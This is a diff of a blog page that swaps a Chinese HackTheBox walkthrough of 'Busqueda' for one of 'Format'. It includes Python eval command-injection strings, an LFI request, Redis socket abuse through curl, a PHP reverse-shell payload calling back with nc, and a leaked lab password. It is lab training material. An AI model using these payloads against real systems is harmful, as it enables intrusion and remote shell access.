@@ -5,7 +5,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="HackTheBox-Busqueda">
+    <meta name="description" content="HackTheBox-Format">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>HTB-Busqueda | wa0er</title>
+    <title>HTB-Format | wa0er</title>
     <link rel="icon" type="image/png" href="/wa0er.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -314,7 +314,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">HTB-Busqueda</h1>
+                    <h1 class="description center-align post-title">HTB-Format</h1>
                 </div>
             </div>
         </div>
@@ -455,28 +455,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-04-15
+                    2023-10-06
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-08-31
+                    2023-11-06
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.6k&nbsp;字
+                    1.1k&nbsp;字
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    5 分
                 </div>
                 
 
@@ -504,162 +504,195 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="HTB-Busqueda"><a href="#HTB-Busqueda" class="headerlink" title="HTB-Busqueda"></a>HTB-Busqueda</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><p>1.信息收集发现命令注入；</p>
-<p>2.命令注入反弹shell获取svc用户权限；</p>
-<p>3.Git信息泄露密码；</p>
-<p>4.<code>sudo -l</code>发现可suid提权；</p>
-<p>5.suid提权获取root权限。</p>
-<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>Nmap，先扫端口，后扫服务</p>
-<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410160635734.png">
+                <h1 id="HTB-Format"><a href="#HTB-Format" class="headerlink" title="HTB-Format"></a>HTB-Format</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><p>1.信息收集主页超链接找到源码；</p>
+<p>2.源码审计本地文件包含+redis未授权；</p>
+<p>3.redis未授权垂直越权；</p>
+<p>4.本地文件包含配合源码漏洞写反弹shell；</p>
+<p>5.sudo -l发现敏感文件；</p>
+<p>6.python格式化字符串漏洞获取root权限。</p>
+<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>端口服务扫描</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230926151139659.png"></p>
+<p>有一个域名<code>microblog.htb</code>和非常规端口3000</p>
+<p>80端口开放，那么直接访问IP发现会自动跳转到<code>http://app.microblog.htb/</code></p>
+<p>那就把两个域名添加进本地hosts文件</p>
+<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.213 microblog.htb app.microblog.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>开放端口：22（ssh）、80（http）；域名：<code>searcher.htb</code></p>
-<p>添加域名解析记录到本地hosts文件</p>
-<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.208 searcher.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>访问<code>microblog.htb</code>是404，访问<code>app.microblog.htb</code>如下图</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927093055876.png" style="zoom:67%;">
 
-<p>浏览器访问<code>http://searcher.htb/</code></p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410102604709.png"></p>
-<p>大致意思，是一个集成了多搜索引擎的搜索平台。</p>
-<p>第一个框（Select your engine）是个下拉框，可选择各种搜索引擎；</p>
-<p>第二个框（What do you want to search for）是想要搜索的内容；</p>
-<p>此处尝试搜索引擎选择Apple，搜索内容为123</p>
-<p>下面的选项<code>Auto redirect</code>，不勾选，搜索时会返回如下格式的链接；勾选，会重定向到指定搜索引擎</p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410103511821.png"></p>
-<p>另外页面底部，可看到<code>Flask</code>框架和<code>Searchor 2.4.0</code>，所以后端是Python</p>
-<h2 id="三、命令注入"><a href="#三、命令注入" class="headerlink" title="三、命令注入"></a>三、命令注入</h2><p>搜索的同时用Burp抓包，测试发现<code>query</code>字段可能有注入，如下两张图。Sqlmap尝试post注入，无果</p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410171555402.png"></p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410171637361.png"></p>
-<p>看了一下Github上Searchor的介绍：<a target="_blank" rel="noopener" href="https://github.com/ArjunSharda/Searchor">https://github.com/ArjunSharda/Searchor</a></p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230411111122155.png"></p>
-<p>根据CLI（Command-Line Interface）命令，推测一下，post参数传到CLI时，拼接大概如下（此处用<code>123'</code>和<code>123"</code>测试，双引号时响应正常，单引号响应异常，所以参数值应该被单引号包裹）</p>
-<pre class="line-numbers language-none"><code class="language-none">searchor engine 'query' --copy
-例：searchor Apple '123' --copy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>有登录和注册功能点，底部有超链接</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927093202732.png" style="zoom:67%;">
 
-<p>想办法在query参数位注入想要执行的命令</p>
-<p>参考：<a target="_blank" rel="noopener" href="https://realpython.com/python-eval-function/">https://realpython.com/python-eval-function/</a></p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230411115221617.png"></p>
-<p>compile()函数语法：</p>
-<pre class="line-numbers language-none"><code class="language-none">compile() 用于将源代码编译为代码对象或AST模块对象。可以根据提供的模式使用exec()或eval()函数执行返回的代码对象，以构造代码对象。
-语法：compile(source, filename, mode, flags=0, dont_inherit=False, optimize=-1)
+<p>点击<code>Contribute here</code>超链接，跳转到如下图界面，是源码</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927094123462.png" style="zoom:67%;">
 
-source: 必选项，表示要编译的源代码，可以是字符串、文件或AST（Abstract Syntax Tree）对象。
-filename: 可选项，表示编译代码的文件名，如果不是从文件中编译代码，传入 “&lt;string&gt;” 即可。
-mode: 可选项，表示编译代码类型，可以取值为 “exec”（编译整个代码），“eval”（编译单个表达式）或“single”（编译单个语句）。
-flags: 可选项，传入变量或位掩码，用于控制编译器的行为或特性。
-dont_inherit: 可选项，表示是否继承sys.flags和sys.__optimizations__模块中相关选项的值。
-optimize: 可选项，指定编译器的优化级别，若设置为-1，表示使用默认优化级别。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>注册个test用户，然后会自动登录，新建一个Blog</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927102245811.png" style="zoom: 50%;">
 
-<p>自己本地用python测试一下，如下</p>
-<pre class="line-numbers language-none"><code class="language-none">test = compile("import os\nos.system('id')","&lt;String&gt;","exec")
-eval(test)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>新建成功后，点击<code>Edit Site</code>，会自动跳转到<code>http://test.microblog.htb/edit/</code>，所以需要把<code>test.microblog.htb</code>添加进本地hosts文件</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927102332626.png" style="zoom: 50%;">
 
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410174447442.png"></p>
-<p>如图可以成功执行<code>id</code>命令</p>
-<p>那就尝试修改请求包，传递如下query值，执行<code>id</code>命令（前面<code>1'</code>和后面<code>'</code>用于闭合，中间有空格的地方用加号连接。实际测试有没有加号都可以，但前后两个<code>%2b</code>需要加，且用空格和%20替代行不通）</p>
-<pre class="line-numbers language-none"><code class="language-none">query=1'%2beval(compile("import+os\nos.system('id')",'&lt;String&gt;','exec'))%2b'
+<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.213 test.microblog.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-传到CLI后：
-searchor Apple '1' eval(compile("import os\nos.system('id')",'&lt;String&gt;','exec')) '' --copy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>添加好后，再次点击<code>Edit Site</code>，会跳转到如下图界面</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927102535862.png" style="zoom:50%;">
 
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410173619288.png"></p>
-<p>可看到有三个地方展示了回显：响应头部<code>Location</code>、响应内容<code>&lt;a&gt;</code>标签<code>href</code>值、响应内容<code>&lt;a&gt;</code>标签文本。且当前用户是<code>svc</code></p>
-<p>再用如下语句执行<code>ls</code>命令查看当前目录下内容</p>
-<pre class="line-numbers language-none"><code class="language-none">query=1'%2beval(compile("import+os\nos.system('ls')",'&lt;String&gt;','exec'))%2b'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>h1和txt是两个设置选项，可以设置header和txt，抓包可看到POST传参分别是<code>id=c0mdsvzdfum&amp;header=headertest</code>、<code>id=jyjs1v121x&amp;txt=txttest</code></p>
+<h2 id="三、LFI（本地文件包含漏洞）"><a href="#三、LFI（本地文件包含漏洞）" class="headerlink" title="三、LFI（本地文件包含漏洞）"></a>三、LFI（本地文件包含漏洞）</h2><p>看源码<code>microblog-template\edit\index.php</code>发现id存在本地文件包含（LFI）漏洞，对POST参数没有丝毫过滤</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927104606899.png"></p>
+<p>POST传参<code>id=../../../../../../../../../../etc/passwd&amp;header=headertest</code>，如下图实现LFI</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927110038896.png"></p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927110023429.png" style="zoom: 50%;">
 
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410185732026.png"></p>
-<p>有<code>app.py</code>和<code>templates</code></p>
-<p>然后执行<code>cat app.py</code>命令查看<code>app.py</code>内容</p>
-<pre class="line-numbers language-none"><code class="language-none">query=1'%2beval(compile("import+os\nos.system('cat+app.py')",'&lt;String&gt;','exec'))%2b'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>再看代码，如果<code>isPro</code>条件为<code>True</code>，即用户身份是Pro，那么我们可以上传文件。于是想办法把用户变成pro权限</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927180629747.png"></p>
+<h2 id="四、redis未授权"><a href="#四、redis未授权" class="headerlink" title="四、redis未授权"></a>四、redis未授权</h2><p>源码中多处出现<code>$redis-&gt;connect('/var/run/redis/redis.sock');</code></p>
+<p>可以用redis未授权，通过redis socket（<code>unix:/var/run/redis/redis.sock</code>），设置test用户的pro为true</p>
+<p><a target="_blank" rel="noopener" href="https://redis.io/commands/hset/">https://redis.io/commands/hset/</a></p>
+<pre class="line-numbers language-none"><code class="language-none">curl -X HSET "http://microblog.htb/static/unix:%2Fvar%2Frun%2Fredis%2Fredis.sock:test%20pro%20true%20a/b"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410200023303.png"></p>
-<p>URL解码得如下代码，从代码中也可以看到post传参的逻辑</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect
-<span class="token keyword">from</span> searchor <span class="token keyword">import</span> Engine
-<span class="token keyword">import</span> subprocess
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927152401752.png"></p>
+<p>执行之后，可看到用户已变成pro权限</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927152459425.png" style="zoom:50%;">
 
-app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+<p>然后如下命令写反弹shell</p>
+<pre class="line-numbers language-none"><code class="language-none">id=/var/www/microblog/test/uploads/rev.php&amp;header=&lt;%3fphp+echo+shell_exec("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+10.10.14.9+9898+&gt;/tmp/f")%3b%3f&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> options<span class="token operator">=</span>Engine<span class="token punctuation">.</span>__members__<span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927153522937.png"></p>
+<p>开启监听</p>
+<p>然后访问<code>http://test.microblog.htb/uploads/rev.php</code></p>
+<p>成功获取www-data用户权限</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927153458744.png"></p>
+<p>依次执行如下命令，找到信息泄露</p>
+<pre class="line-numbers language-none"><code class="language-none">redis-cli -s /run/redis/redis.sock
+keys *
+hgetall cooper.dooper<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/search'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927153919922.png"></p>
+<p>然后ssh尝试连接，实际用户名密码如下</p>
+<pre class="line-numbers language-none"><code class="language-none">cooper:zooperdoopercooper<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927154156545.png"></p>
+<p>执行<code>sudo -l</code>，查看可以以root身份执行的命令</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927154506078.png"></p>
+<p><code>/usr/bin/license</code>内容如下</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span>
+
+<span class="token keyword">import</span> base64
+<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>backends <span class="token keyword">import</span> default_backend
+<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives <span class="token keyword">import</span> hashes
+<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives<span class="token punctuation">.</span>kdf<span class="token punctuation">.</span>pbkdf2 <span class="token keyword">import</span> PBKDF2HMAC
+<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>fernet <span class="token keyword">import</span> Fernet
+<span class="token keyword">import</span> random
+<span class="token keyword">import</span> string
+<span class="token keyword">from</span> datetime <span class="token keyword">import</span> date
+<span class="token keyword">import</span> redis
+<span class="token keyword">import</span> argparse
+<span class="token keyword">import</span> os
+<span class="token keyword">import</span> sys
+
+<span class="token keyword">class</span> <span class="token class-name">License</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        chars <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> string<span class="token punctuation">.</span>punctuation
+        self<span class="token punctuation">.</span>license <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>chars<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>created <span class="token operator">=</span> date<span class="token punctuation">.</span>today<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> os<span class="token punctuation">.</span>geteuid<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Microblog license key manager can only be run as root"</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
+    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">'Microblog license key manager'</span><span class="token punctuation">)</span>
+group <span class="token operator">=</span> parser<span class="token punctuation">.</span>add_mutually_exclusive_group<span class="token punctuation">(</span>required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+group<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-p'</span><span class="token punctuation">,</span> <span class="token string">'--provision'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Provision license key for specified user'</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">'username'</span><span class="token punctuation">)</span>
+group<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-d'</span><span class="token punctuation">,</span> <span class="token string">'--deprovision'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Deprovision license key for specified user'</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">'username'</span><span class="token punctuation">)</span>
+group<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-c'</span><span class="token punctuation">,</span> <span class="token string">'--check'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Check if specified license key is valid'</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">'license_key'</span><span class="token punctuation">)</span>
+args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+r <span class="token operator">=</span> redis<span class="token punctuation">.</span>Redis<span class="token punctuation">(</span>unix_socket_path<span class="token operator">=</span><span class="token string">'/var/run/redis/redis.sock'</span><span class="token punctuation">)</span>
+
+secret <span class="token operator">=</span> <span class="token punctuation">[</span>line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> line <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/root/license/secret"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+secret_encoded <span class="token operator">=</span> secret<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+salt <span class="token operator">=</span> <span class="token string">b'microblogsalt123'</span>
+kdf <span class="token operator">=</span> PBKDF2HMAC<span class="token punctuation">(</span>algorithm<span class="token operator">=</span>hashes<span class="token punctuation">.</span>SHA256<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>length<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">,</span>salt<span class="token operator">=</span>salt<span class="token punctuation">,</span>iterations<span class="token operator">=</span><span class="token number">100000</span><span class="token punctuation">,</span>backend<span class="token operator">=</span>default_backend<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+encryption_key <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64encode<span class="token punctuation">(</span>kdf<span class="token punctuation">.</span>derive<span class="token punctuation">(</span>secret_encoded<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+f <span class="token operator">=</span> Fernet<span class="token punctuation">(</span>encryption_key<span class="token punctuation">)</span>
+l <span class="token operator">=</span> License<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment">#provision</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>provision<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    user_profile <span class="token operator">=</span> r<span class="token punctuation">.</span>hgetall<span class="token punctuation">(</span>args<span class="token punctuation">.</span>provision<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> user_profile<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"User does not exist. Please provide valid username."</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
+        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    existing_keys <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/root/license/keys"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>
+    all_keys <span class="token operator">=</span> existing_keys<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> user_key <span class="token keyword">in</span> all_keys<span class="token punctuation">:</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>user_key<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> args<span class="token punctuation">.</span>provision<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"License key has already been provisioned for this user"</span><span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
+            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    prefix <span class="token operator">=</span> <span class="token string">"microblog"</span>
+    username <span class="token operator">=</span> r<span class="token punctuation">.</span>hget<span class="token punctuation">(</span>args<span class="token punctuation">.</span>provision<span class="token punctuation">,</span> <span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    firstlast <span class="token operator">=</span> r<span class="token punctuation">.</span>hget<span class="token punctuation">(</span>args<span class="token punctuation">.</span>provision<span class="token punctuation">,</span> <span class="token string">"first-name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>hget<span class="token punctuation">(</span>args<span class="token punctuation">.</span>provision<span class="token punctuation">,</span> <span class="token string">"last-name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    license_key <span class="token operator">=</span> <span class="token punctuation">(</span>prefix <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">"{license.license}"</span> <span class="token operator">+</span> firstlast<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>license<span class="token operator">=</span>l<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Plaintext license key:"</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"------------------------------------------------------"</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>license_key<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
+    license_key_encoded <span class="token operator">=</span> license_key<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    license_key_encrypted <span class="token operator">=</span> f<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>license_key_encoded<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Encrypted license key (distribute to customer):"</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"------------------------------------------------------"</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>license_key_encrypted<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/root/license/keys"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> license_keys_file<span class="token punctuation">:</span>
+        license_keys_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>args<span class="token punctuation">.</span>provision <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> license_key_encrypted<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>
+
+<span class="token comment">#deprovision</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>deprovision<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"License key deprovisioning coming soon"</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
+    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment">#check</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>check<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
     <span class="token keyword">try</span><span class="token punctuation">:</span>
-        engine <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'engine'</span><span class="token punctuation">)</span>
-        query <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">)</span>
-        auto_redirect <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'auto_redirect'</span><span class="token punctuation">)</span>
-        
-        <span class="token keyword">if</span> engine <span class="token keyword">in</span> Engine<span class="token punctuation">.</span>__members__<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-            arg_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'searchor'</span><span class="token punctuation">,</span> <span class="token string">'search'</span><span class="token punctuation">,</span> engine<span class="token punctuation">,</span> query<span class="token punctuation">]</span>
-            r <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>arg_list<span class="token punctuation">,</span> capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
-            url <span class="token operator">=</span> r<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
-            <span class="token keyword">if</span> auto_redirect <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
